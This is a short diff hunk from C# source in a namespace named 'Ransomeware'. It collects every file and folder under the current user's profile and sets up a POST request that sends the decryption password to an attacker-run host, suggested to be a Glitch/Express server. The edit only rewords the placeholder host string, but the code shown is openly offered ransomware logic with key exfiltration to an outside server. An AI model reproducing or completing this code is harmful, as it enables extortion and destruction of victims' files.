@@ -22,7 +22,7 @@ namespace Ransomeware
         {
             var directory = Directory.GetFiles(@"C:\Users\" + Environment.UserName);
             var folders = Directory.GetDirectories(@"C:\Users\" + Environment.UserName);
-            string host = "your host url, you can use glitch and express app example in readme";
+            string host = "website url, glitch can be used, express app example in readme";
 
             //sending a post request to your host includes the password to decrypt files
             var httpWebRequest = (HttpWebRequest)WebRequest.Create(host);
